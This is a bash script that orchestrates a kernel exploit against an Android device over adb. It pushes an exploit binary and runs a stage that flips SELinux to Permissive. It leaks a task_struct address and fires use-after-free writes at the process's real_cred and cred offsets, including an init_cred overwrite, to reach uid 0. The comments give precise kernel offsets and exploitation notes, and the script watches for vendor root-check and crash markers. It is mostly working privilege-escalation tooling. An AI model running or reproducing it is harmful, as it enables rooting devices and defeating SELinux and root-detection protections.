#!/bin/bash
# run_bootA.sh — ONE boot, ONE question, ONE shot.
#
#   "does a single 0x778 PI write, whose write_value is a sprayed HEAP pointer
#    instead of the init_cred image, reboot the machine?"
#
# Design rules (2026-09-18, after the first two attempts):
#   * The kernel log is streamed to the HOST (`adb exec-out cat /dev/kmsg`).
#     It must never live only on the device: the ring buffer dies with the
#     reboot, and the reboot IS the event.  `dmesg -w` is a no-op on toybox.
#   * One shot per boot.  No retry rounds, and NEVER SIGKILL a writer whose
#     three-thread futex protocol may still be live — that tears down half a
#     wait queue.  The old runners retried because `probe_state` said "miss",
#     but W1 proved `probe_state` is not a "did it land" signal.
#   * The judge is the target's own readback, and the GATE is after 0x780 +
#     repair, never after 0x778:
#       /proc/<pid>/status Uid  <- real_cred (task+0x778)   [recorded as data]
#       the child's getuid()    <- cred      (task+0x780)   [the real gate]
#     (procfs really does read real_cred -- get_task_cred() in this image loads
#      task+0x778 -- but the write commits asynchronously, so an early read is
#      not a verdict either way.  Poll it, record it, do not abort on it.)
#   * The writer must not sit in sleep(HOLD): V12_PIN_FORK=1 forks a pin child
#     that inherits the sockets, so the payload page stays alive while the
#     writer returns immediately.
#
# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= CONTROL=1
#   CONTROL=1 fires the single 0x778 shot with V12_ALLOW_INIT_CRED=1, i.e.
#   write_value = the init_cred image instead of a sprayed page.  It REPLACES
#   the normal shot, it does not add one — run it as its own boot, and only
#   after a boot in which the sprayed-page shot did NOT reboot:
#     sprayed-page shot reboots, init_cred shot does not  -> the problem is the
#       IDENTITY of write_value, not the UAF.
#     both reboot                                          -> the problem is the
#       protocol/retry/capture, independent of the cred content.
set -u
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"

ADB=${ADB:-adb}
SER=${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}
DEV=/data/local/tmp
# A run-unique tag on EVERY device-side path.  After one of these events the
# files in /data/local/tmp can become root-owned and un-statable for shell
# (`adb push` then fails with "stat failed ... Permission denied", `rm`/`mv`
# fail too), so reusing a fixed name poisons the next run.  Same reason the
# per-shot evidence path below is unique.
TAG=${TAG:-$(date +%m%d_%H%M%S)}
BIN=$DEV/glxA_$TAG       # LT + W1
BINW=$DEV/glxW_$TAG      # W7 only
EV=$DEV/bootA_ev_$TAG.txt
TASKF=$DEV/bootA_task_$TAG.txt
RES=$DEV/bootA_res_$TAG.txt
OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
HOLD=${HOLD:-20}
CHAINWAIT=${CHAINWAIT:-4000}
CONTROL=${CONTROL:-0}
KLOG=$OUT/klog.host
mkdir -p "$OUT"

A() { "$ADB" -s "$SER" shell "$@"; }
say() { echo "[$(date +%H:%M:%S)] $*"; }
detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }
uid_line() { A "grep -m1 '^Uid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
svc_count() {
    local n=0 s
    for s in package power input phone wifi; do
        case "$(A "service check $s" 2>/dev/null | tr -d '\r')" in *found*) n=$((n+1));; esac
    done
    echo "$n"
}

say "=== preflight ==="
"$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
    | tee "$OUT/00_preflight.txt" | tr -d '\r'
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BIN"  2>&1 | tail -1
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BINW" 2>&1 | tail -1
A "chmod 755 $BIN $BINW"

# ---------------------------------------------------------------- 1. Permissive
say "=== step 1: SELinux Permissive ==="
if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
    say "  already Permissive — skipping W1 entirely (no timeout 190 ./$(basename $BIN) W1)"
else
    W1OK=0
    for r in 1 2 3 4 5 6 7 8; do
        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename $BIN) W1 >/dev/null 2>&1"
        EN=$(A 'getenforce' | tr -d '\r')
        say "  W1 round $r: $EN"
        [ "$EN" = "Permissive" ] && { W1OK=1; break; }
        sleep 2
    done
    [ "$W1OK" = 1 ] || { say "!! not Permissive — stopping"; exit 2; }
fi

# ---------------------------------------------------------------- 2. HOST klog
# A real stream, not a device-side file.  If the box reboots, the last lines in
# this file ARE the reboot, and they are already on the host.
say "=== step 2: host-side kernel log stream (/dev/kmsg -> $KLOG) ==="
: > "$KLOG"
( "$ADB" -s "$SER" exec-out cat /dev/kmsg >> "$KLOG" 2>/dev/null ) &
KLOGPID=$!
sleep 3
say "  klog.host lines after 3s: $(wc -l < "$KLOG")"

# ---------------------------------------------------------------- 3. settle
say "=== step 3: load settle (max 15s, threshold 16) ==="
for i in 1 2 3 4 5 6 7; do
    L=$(A 'cut -d" " -f1 /proc/loadavg' | tr -d '\r')
    say "  load1=$L"
    awk -v l="$L" 'BEGIN{exit !(l+0 < 16)}' && break
    sleep 2
done

# ---------------------------------------------------------------- 4. LT
say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
TASK=""; CPID=""; PPID_LT=""
for attempt in 1 2 3 4; do
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev.txt V12_NO_EXEC=1 ./$(basename $BIN) LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
    for i in $(seq 1 25); do
        sleep 1
        TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
        [ -n "$TASK" ] && break
    done
    [ -n "$TASK" ] && break
    say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt_$TAG.log 2>/dev/null" | tr -d '\r')"
done
[ -z "$TASK" ] && { say "!! no task leak — stopping"; exit 3; }
LTLOG=$(A "cat $DEV/bootA_lt_$TAG.log 2>/dev/null")
CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
say "  baseline: $(uid_line "$CPID")"

# ---------------------------------------------------------------- 5. one shot
# Fire once, read the evidence as soon as the parameters are printed (do NOT
# wait for probe_state — it is not a verdict), then let the writer exit by
# itself.  Nothing is killed.
shot() {  # $1=off $2=extra $3=tag -> echoes the write value it used
    local off=$1 extra=$2 tag=$3
    # A UNIQUE evidence path per shot.  Reusing one file means that if `rm -f`
    # fails (a previous event can leave /data/local/tmp files root-owned and
    # un-statable for shell), the poll reads the PREVIOUS shot's output and
    # breaks immediately with the wrong content.
    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
    A "rm -f $ev 2>/dev/null; true"
    say "  [$tag] firing ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s ${extra:-}"
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$ev ./$(basename $BINW) W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
    local i out=""
    for i in $(seq 1 15); do            # capped at 15 s, not 90
        sleep 1
        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
        printf '%s' "$out" | grep -q 'write value' && break
    done
    sleep 2                             # let the store commit before judging
    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
    grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|side effect|REFUSED|PIN child|HOLD' \
        "$OUT/w7_$tag.txt" | sed 's/^/    /'
    printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1
}

# Uid: in /proc/<pid>/status reads real_cred (task+0x778), NOT cred (task+0x780).
# Proven twice: get_task_cred() in this kernel image does `add x9,x0,#0x778;
# ldar x19,[x9]`, and task_state() then dereferences that pointer at exactly the
# cred field offsets ([+4] uid, [+0x14] euid, [+0xc] suid, [+0x1c] fsuid, [+8]
# gid, [+0x18] egid, [+0x10] sgid, [+0x20] fsgid, [+0x90] group_info) -- that is
# the Uid/Gid/Groups block.  And out/t5_w7_778.txt, a 0x778-ONLY write, moved
# this very line to `0 0 4294967176 0`.
#
# Even so, the write commits ASYNCHRONOUSLY ("chain async commit" in the code),
# so a fixed 2 s read can miss a write that did land -- that is the real way to
# get a false "did not take".  So: poll for a bounded window, record the result
# as DATA, and never abort the sequence on it.  The gate is after 0x780 +
# repair, because that is what getuid() reads.
poll_uid() {   # $1=pid $2=timeout_s
    local pid=$1 t=$2 i u=""
    for i in $(seq 1 "$t"); do
        u=$(uid_line "$pid")
        case "$u" in
            ""|*"2000 2000 2000 2000"*) sleep 1;;
            *) echo "$u"; return 0;;
        esac
    done
    echo "$u"
}
alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }

say "=== step 5: ONE 0x778 shot (real_cred) ==="
if [ "$CONTROL" = "1" ]; then
    say "  ⚠ CONTROL MODE: V12_ALLOW_INIT_CRED=1 — writing the global init_cred image"
    shot 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl >/dev/null
else
    shot 0x778 "" w778 >/dev/null
fi
if ! alive; then say "  !! DEVICE GONE right after the 0x778 shot — that is the event"; exit 5; fi
say "  polling /proc/$CPID/status Uid for up to 20s (async commit) ..."
U778=$(poll_uid "$CPID" 20)
say "  after 0x778: [$U778]"
case "$U778" in
  *"0 0"*) say "  → real_cred took.";;
  *)       say "  → real_cred has not moved (yet).  Recorded as data; NOT aborting —"
           say "    the gate is 0x780 + repair, which is what getuid() reads.";;
esac
say "  machine alive: $(alive && echo yes || echo NO)"

say "=== step 6: ONE 0x780 shot (cred) ==="
CRED=$(shot 0x780 "" w780)
if ! alive; then say "  !! DEVICE GONE right after the 0x780 shot"; exit 5; fi
U780=$(poll_uid "$CPID" 12)
say "  after 0x780: [$U780]"

say "=== step 7: ONE local repair of that cred's +8 ==="
if [ -n "$CRED" ]; then
    shot 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair >/dev/null
    if ! alive; then say "  !! DEVICE GONE right after the repair shot"; exit 5; fi
    UREP=$(poll_uid "$CPID" 12)
    say "  after repair: [$UREP]"
else
    UREP="$U780"
    say "  !! no cred address captured — skipping repair"
fi

say "=== verdict (gate lives here, not after 0x778) ==="
RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
say "  /proc/$CPID/status Uid: [$UREP]"
say "  child's own report:     [$RPT]"
case "$UREP$RPT" in
  *"0 0 0 0"*|*"uid=0"*|*"noexec"*)
        say "  ★ CRED TOOK — this boot can answer the Boot A question.";;
  *)    say "  ✗ cred did NOT take in this boot.  One shot was fired per offset,"
        say "    nothing was killed; take a fresh boot rather than adding rounds.";;
esac

say "=== step 8: poke LT parent ==="
[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
for i in $(seq 1 20); do
    sleep 1
    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
    [ -n "$R" ] && { say "  child report: $R"; break; }
done

say "=== step 9: watch 60s ==="
for i in $(seq 10 10 60); do
    sleep 10
    UP=$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')
    [ -z "$UP" ] && { say "  !! device gone at t+${i}s — REBOOT"; break; }
    say "  t+${i}s up=$UP services=$(svc_count)/5"
done

# ---------------------------------------------------------------- 10. evidence
say "=== step 10: evidence ==="
kill "$KLOGPID" 2>/dev/null; wait "$KLOGPID" 2>/dev/null
say "  klog.host: $(wc -l < "$KLOG") lines"
say "  --- reboot / watchdog markers (NOT ROOTCHECK) ---"
if grep -anE 'sys_reboot|reboot: |Restarting system|Watchdog|watchdog|theia|hung_task|softlockup|soft lockup|panic|Unable to handle|Call trace|BUG:' \
        "$KLOG" | tail -40 > "$OUT/10_reboot_markers.txt"; then
    sed 's/^/    /' "$OUT/10_reboot_markers.txt" | tail -25
else
    say "    (none)"
fi
say "  --- guard markers, for completeness ---"
grep -aE 'ROOTCHECK|oplus_root|sys_call_number|path@@|execve_' "$KLOG" | tail -20 > "$OUT/10_rootcheck.txt"
if [ -s "$OUT/10_rootcheck.txt" ]; then sed 's/^/    /' "$OUT/10_rootcheck.txt"; else say "    (none)"; fi
A "getprop ro.boot.bootreason; getenforce; uptime; grep -c '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
for f in bootA_lt_$TAG.log bootA_lt_ev.txt bootA_w1_ev_$TAG.txt; do
    A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
done
say "evidence -> $OUT"
say "=== done ==="
